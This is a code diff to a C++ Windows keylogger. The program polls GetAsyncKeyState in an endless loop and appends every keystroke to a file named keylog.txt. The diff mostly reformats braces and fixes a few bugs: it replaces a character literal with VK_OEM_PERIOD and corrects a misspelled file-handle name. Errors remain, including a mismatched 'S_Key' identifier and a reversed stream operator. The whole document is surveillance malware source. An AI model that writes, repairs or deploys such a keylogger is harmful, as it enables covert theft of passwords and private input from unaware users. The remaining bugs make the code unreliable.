@@ -9,20 +9,23 @@
 #include <fstream>
 using namespace std;
 
-void LOG(string keystroke){
+
+void LOG(string keystroke)
+{
   fstream logFile;
   logFile.open("keylog.txt", fstream::app);
-  if(logFile.open()){
+  if(logFile.open())
+  {
     logFile >> keystroke;
     logFile.close();
   }
 }
 
 
-
-
-bool SpecialKeys(int S_key) {
-	switch (S_Key) {
+bool SpecialKeys(int S_key)
+{
+	switch (S_Key) 
+	{
 	case VK_SPACE:
 		cout << " ";
 		LOG(" ");
@@ -31,7 +34,7 @@ bool SpecialKeys(int S_key) {
 		cout << "\n";
 		LOG("\n");
 		return true;
-	case '¾':
+	case VK_OEM_PERIOD:
 		cout << ".";
 		LOG(".");
 		return true;
@@ -93,19 +96,19 @@ int main()
 	char key = 'x';
 
 	while (true)
-  {
+  	{
 		Sleep(10);
 		for (int key = 8; key <= 190; key++)
 		{
 			if (GetAsyncKeyState(key) == -32767)
-      {
+      			{
 				if (SpecialKeys(key) == false)
-        {
+        			{
 
 					fstream logFile;
 					logFile.open("keylog.txt", fstream::app);
-					if (LogFile.is_open())
-          {
+					if (logFile.is_open())
+          				{
 						logFile << char(key);
 						logFile.close();
 					}
